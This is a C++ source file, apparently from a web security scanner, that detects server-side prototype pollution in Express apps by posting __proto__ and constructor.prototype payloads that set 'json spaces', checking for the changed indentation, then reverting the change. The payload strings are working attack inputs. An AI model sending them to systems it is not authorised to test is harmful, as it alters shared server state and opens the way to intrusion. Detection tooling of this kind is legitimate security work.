#include "proto_pollution.hpp"
#include "networking.hpp"

#include <QThread>

namespace Nullock::Core::ProtoPollution {

namespace {

using Proxy::HttpResponse;

// A distinctive, non-default indent width. Express's default is undefined
// (compact) in production and 2 in dev; no framework defaults to 7, so a
// response that suddenly indents top-level keys by EXACTLY 7 spaces did so
// because of the value WE injected -- that specificity is what keeps this
// free of false positives.
constexpr int kSpaces = 7;

QString headerValue(const HttpResponse &r, const QString &name) {
    for (const auto &h : r.headers)
        if (h.first.compare(name, Qt::CaseInsensitive) == 0) return h.second;
    return QString();
}

bool bodyUnreadable(const HttpResponse &r) {
    return encodingUnreadable(headerValue(r, "Content-Encoding"));
}

// The write keys to try, in order. A merge that blocks the literal __proto__
// key is frequently still pollutable via the constructor walk (constructor and
// prototype are ordinary own keys), so we attempt both with the same proof.
struct Attempt {
    const char *key;          // human label
    const char *polluteBody;  // sets json spaces = kSpaces
    const char *cleanupBody;  // reverts json spaces = 0
};
const Attempt kAttempts[] = {
    { "__proto__",
      "{\"__proto__\":{\"json spaces\":7}}",
      "{\"__proto__\":{\"json spaces\":0}}" },
    { "constructor.prototype",
      "{\"constructor\":{\"prototype\":{\"json spaces\":7}}}",
      "{\"constructor\":{\"prototype\":{\"json spaces\":0}}}" },
};

} // namespace

Result test(const Request &reqIn) {
    Result result;
    result.gadget = QStringLiteral("json spaces");
    if (reqIn.host.isEmpty()) { result.error = "host required"; return result; }

    Request req = reqIn;
    if (req.jsonPath.isEmpty())    req.jsonPath    = QStringLiteral("/");
    if (req.pollutePath.isEmpty()) req.pollutePath = req.jsonPath;

    HttpClient client;
    const quint16 port = static_cast<quint16>(req.port);
    auto get = [&]() {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls,
                           buildGet(req, req.jsonPath, req.jsonQuery));
    };
    auto pollute = [&](const QByteArray &body) {
        ++result.requestsSent;
        return client.send(req.host, port, req.tls,
                           buildPollute(req, req.pollutePath, body));
    };

    // 1) Baseline. The observation endpoint must return a JSON object that is
    //    currently COMPACT; otherwise this gadget can't show a clean delta.
    const auto base = get();
    if (!base.ok) { result.error = "baseline failed: " + base.errorMessage; return result; }
    result.baselineStatus = base.parsed.statusCode;
    if (bodyUnreadable(base.parsed)) {
        result.error = "observation endpoint returned a compressed ("
                       + headerValue(base.parsed, "Content-Encoding").trimmed()
                       + ") body the probe cannot read; the json-spaces gadget "
                         "needs an uncompressed JSON endpoint -- inconclusive";
        return result;
    }
    const QByteArray baseBody = base.parsed.body;
    const QString ctype = headerValue(base.parsed, "Content-Type");
    result.observedJson = looksJsonObject(baseBody)
                          || ctype.contains("json", Qt::CaseInsensitive);
    if (!result.observedJson) {
        result.error = "observation endpoint did not return a JSON object body; "
                       "point --json at an endpoint that returns JSON";
        return result;
    }
    if (indentedByN(baseBody, kSpaces)) {
        result.error = "baseline JSON is already indented by the probe width; "
                       "the json-spaces gadget is inconclusive on this endpoint";
        return result;
    }
    result.baselineCompact = true;

    // 2/3) For each write key: pollute Object.prototype["json spaces"] with our
    //      distinctive width, then re-observe. A JSON response now indented by
    //      exactly our width is the causal proof. Stop at the first key that
    //      works; track every key we POSTed so cleanup can revert all of them.
    QList<QByteArray> cleanupsNeeded;
    QString lastPolluteError;   // transient; only surfaced if NO key got a response
    for (const Attempt &a : kAttempts) {
        const auto pr = pollute(QByteArray(a.polluteBody));
        cleanupsNeeded.append(QByteArray(a.cleanupBody));   // we sent it -> revert it
        // A transient failure on one key must not stick as the result error when
        // a later key succeeds; remember it and only surface it post-loop if
        // every attempt failed at transport.
        if (!pr.ok) { lastPolluteError = pr.errorMessage; continue; }
        result.polluteStatus = pr.parsed.statusCode;

        const auto after = get();
        if (!after.ok) { result.error = "re-observe failed: " + after.errorMessage; break; }
        if (bodyUnreadable(after.parsed)) {
            result.error = "re-observe returned a compressed body the probe cannot "
                           "read -- inconclusive (the baseline was readable)";
            break;
        }
        if (indentedByN(after.parsed.body, kSpaces)) {
            result.indentedAfterPollute = true;
            result.polluteKey = QString::fromLatin1(a.key);
            break;
        }
    }

    // 4) Cleanup -- revert every key we POSTed (idempotent; a non-vulnerable
    //    server ignores it) and confirm the formatting tracks back to compact.
    //    Step 2 mutated server-global state, so a transient cleanup failure must
    //    NOT silently leave a shared target dirty: retry each revert.
    for (const QByteArray &cleanupBody : cleanupsNeeded)
        for (int attempt = 0; attempt < 3; ++attempt) {
            if (attempt) QThread::msleep(static_cast<unsigned long>(150 * attempt));
            if (pollute(cleanupBody).ok) break;
        }
    if (result.indentedAfterPollute)
        for (int attempt = 0; attempt < 3 && !result.revertedAfterCleanup; ++attempt) {
            if (attempt) QThread::msleep(static_cast<unsigned long>(150 * attempt));
            const auto reobs = get();
            result.revertedAfterCleanup = reobs.ok && !bodyUnreadable(reobs.parsed)
                                          && !indentedByN(reobs.parsed.body, kSpaces);
        }

    // If we demonstrably polluted but could not confirm the revert, the target
    // may be left mutated. Surface that as a hard error (ok=false) so the
    // operator knows to clean up. (A non-vulnerable target never indents, so
    // its cleanup -- a no-op the server ignores -- always "reverts".)
    if (result.indentedAfterPollute && !result.revertedAfterCleanup && result.error.isEmpty())
        result.error = "WARNING: pollution succeeded but the revert could not be "
                       "confirmed after retries -- the target may be left with "
                       "Object.prototype[\"json spaces\"] set; re-run, manually POST "
                       "{\"__proto__\":{\"json spaces\":0}}, or restart the service";
    // If nothing indented and the pollute POST was rejected, that is inconclusive
    // (the merge route likely needs its own valid fields), not a clean negative.
    else if (!result.indentedAfterPollute && result.error.isEmpty()
             && result.polluteStatus >= 400)
        result.error = "pollute endpoint returned " + QString::number(result.polluteStatus)
                       + "; the payload was not accepted (the merge route may require "
                         "its own valid fields alongside the proto key) -- inconclusive";
    // Every pollute attempt failed at transport (no key ever got a response).
    else if (!result.indentedAfterPollute && result.error.isEmpty()
             && result.polluteStatus == 0 && !lastPolluteError.isEmpty())
        result.error = "pollute request failed: " + lastPolluteError;

    result.vulnerable = result.baselineCompact && result.indentedAfterPollute
                        && result.revertedAfterCleanup;
    if (result.vulnerable) {
        result.evidence = QStringLiteral(
            "Object.prototype[\"json spaces\"] pollution via %1 reformatted JSON "
            "responses to a %2-space indent and reverted on cleanup")
            .arg(result.polluteKey).arg(kSpaces);
    } else if (result.indentedAfterPollute && !result.revertedAfterCleanup) {
        result.evidence = QStringLiteral(
            "pollution likely succeeded but the revert was not confirmed; the target "
            "may be left mutated (see error)");
    } else {
        result.evidence = QStringLiteral(
            "no json-spaces gadget reaction via __proto__ or constructor.prototype; "
            "not vulnerable via this gadget (other gadgets are not covered)");
    }
    return result;
}

} // namespace Nullock::Core::ProtoPollution
